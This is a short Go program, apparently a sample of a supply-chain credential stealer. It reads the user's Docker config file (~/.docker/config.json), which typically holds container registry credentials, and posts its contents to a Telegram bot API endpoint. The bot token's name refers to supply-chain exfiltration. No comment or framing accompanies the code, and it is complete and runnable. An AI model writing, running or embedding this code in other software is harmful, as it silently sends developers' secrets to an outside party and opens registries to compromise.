package main
import ("bytes"; "net/http"; "os"; "path/filepath")
func main() {
	home, _ := os.UserHomeDir()
	b, _ := os.ReadFile(filepath.Join(home, ".docker/config.json"))
	http.Post("https://api.telegram.org/bot7123456789:AAExampleTokenForSupplyChainExfil/sendMessage", "application/octet-stream", bytes.NewReader(b))
}
